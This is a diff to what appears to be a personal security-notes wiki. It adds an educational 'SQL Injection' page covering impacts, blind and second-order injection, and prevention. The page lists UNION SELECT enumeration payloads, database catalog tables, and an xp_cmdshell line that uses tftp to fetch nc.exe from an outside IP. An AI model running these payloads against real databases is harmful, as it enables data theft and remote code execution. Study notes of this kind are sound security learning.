@@ -197,6 +197,8 @@ Error message and password prompt
 
 <li>Recon: Google Dorking</li>
 
+<li>SQL Injection</li>
+
 <li>Table of Contents</li>
 
 <li>Web: Cookies</li>
@@ -9125,13 +9127,102 @@ While you're at it, you might want to take a look at my networking notes for var
 * ''All In Text'': `allintext:&lt;word1&gt; &lt;word2&gt; ...` searches for pages whose content contains //all// words specified.
 * ''Around'': `&lt;word1&gt; AROUND(x) &lt;word2&gt;` searches for pages containing two words that appear within `x` words of each other.</pre>
 </div>
-<div created="20200131024136331" creator="cwshugg" modified="20200905015226496" modifier="cwshugg" tags="" title="Table of Contents">
-<pre>! Reconnaissance
+<div created="20200905201655323" creator="cwshugg" modified="20200905201706447" modifier="cwshugg" tags="databases" title="SQL Injection">
+<pre>The basis of an SQL Injection attack is the idea that a web server takes user input and interprets is as part of an SQL command. The command/query gets executed, and any malicious-intending command is willingly run by the web server.
+
+The typical attack process:
+
+# A website has some form (a textbox, maybe)
+# The attacker submits a carefully-crafted string containing SQL exploit 'code'
+# The server builds a string with the exploit and sends a query to the database
+# The database completes the query and returns the data. The data is returned to the user
+
+! Impacts of SQL Injections
+Lots of damage can be done with an SQL Injection. The following are common:
+
+* Leakage of sensitive information
+* Reputation decline
+* Modification of sensitive information
+* Loss of control over a database server
+* Data loss
+* Denial of service
+
+! Attack Strategies
+There are lots of strategies used to find out information about tables in a backend database:
+
+!! Determine the number of columns in a query
+* Send progressively longer NULL columns until the correct query is returned:
+** `UNION SELECT NULL`
+** `UNION SELECT NULL, NULL`
+** `UNION SELECT NULL, NULL, NULL`
+** ...
+
+!! Determine the type of columns
+* Replace a `NULL` with a literal value (ex: `3`, `'string'`, etc.):
+** `UNION SELECT 'test', NULL, NULL`
+** `UNION SELECT NULL, 'test', NULL`
+** `UNION SELECT NULL, NULL, 'test'`
+
+!! Determine table and column names
+* ''Oracle'':
+** `user_objects` table: contains information about the tables for an application
+** `user_tab_column` table: contains the names of columns associated with a table
+* ''MS-SQL'':
+** `sysobjects` table: contains information about the tables in the database
+** `syscolumns` table: contains names of the columns associated with a table
+* ''MySQL'':
+** `information_schema.tables`: contains information about the table names
+** `information_schema.columns`: contains information about the columns in a table
+
+! Attack Types
+!! Union Attacks
+Using the `UNION` keyword in SQL's language, an injected request can UNION itself with any query the attacker wants. This opens the field for quite a lot of damage.
+
+!! Blind SQL Injections
+Some applications' user interfaces prohibit any error messages from being displayed as a countermeasure. This makes the SQL injection &quot;blind&quot;. This isn't enough of a countermeasure, though. Attackers can use other &quot;side channels&quot; to get feedback.
+
+To get around this, usually trial-and-error occurs. For example: an attacker might inject a SQL request into a URL in attempt to determine if injection is possible.
+
+!! Executing Processes with SQL Injections
+SQL has commands that allow for a process to be executed on the victim machine. For example, adding `exec master..xp_cmdshell 'tftp 192.168.1.1 GET nc.exe c:\nc.exe'` would take the injected query's output and download it to a machine specified by the IP address. Other malicious things can be achieved, too, such as creating backdoors.
+
+!! Second Order SQL Injection
+An attacker, if he has access to a database, can write a malicious value into a table. When that value is used in a query, //then// the SQL injection will occur.
+
+For example, if an attacker sets their user name to `john'--`, then uses an `UPDATE` command to update that user's password, this might happen: `UPDATE users SET password= ... where username='john'--'`.
+
+! Preventing SQL Injection
+The rule of thumb to prevent SQL injections is: developers must //never// allow client-supplied data to modify SQL statements. Other prevention techniques:
+
+* Whitelisting input
+** Blacklisting characters may not work, so whitelisting is the way to go
+*** For example, if `'` is blacklisted, the last name `O'Brien` wouldn't be accepted
+** Use whitelisting to allow a well-defined set of safe values (`[A-Za-z0-9]`, for example)
+* Escaping
+** For valid string inputs with possibly-blacklisted characters (`O'Brien`), use escape characters
+*** Example: `O'Brien` becomes `O''Brien`
+* Stored procedures
+** Isolate applications from SQL
+** All SQL statements required by the application are stored as procedures on the database server
+* Prepared statements
+** Statements are compiled into SQL statements //before// the user input is added
+* Sanitize user inputs!
+
+</pre>
+</div>
+<div created="20200131024136331" creator="cwshugg" modified="20200905200823851" modifier="cwshugg" tags="" title="Table of Contents">
+<pre>! Anonymity
+* [[Being Anonymous on the Web|https://youtu.be/_393maHbHWc]]
+
+! Reconnaissance
 * [[Google Dorking|Recon: Google Dorking]]
 
 ! Web Exploits
 * [[Server Side Includes|Web: SSI]]
-* [[Cookies|Web: Cookies]]</pre>
+* [[Cookies|Web: Cookies]]
+
+! Database Exploits
+* [[SQL Injection|SQL Injection]]</pre>
 </div>
 <div created="20200905015231436" creator="cwshugg" modified="20200905015552259" modifier="cwshugg" tags="web" title="Web: Cookies">
 <pre>Cookies are small pieces of information given out by web servers and stored by your browser. Typically, once your browser has saved cookies for a specific web site, those cookies will be sent back to the web site every time you connect. These can be used to help the site remember specific options you selected, such as &quot;remember me&quot; after logging in.
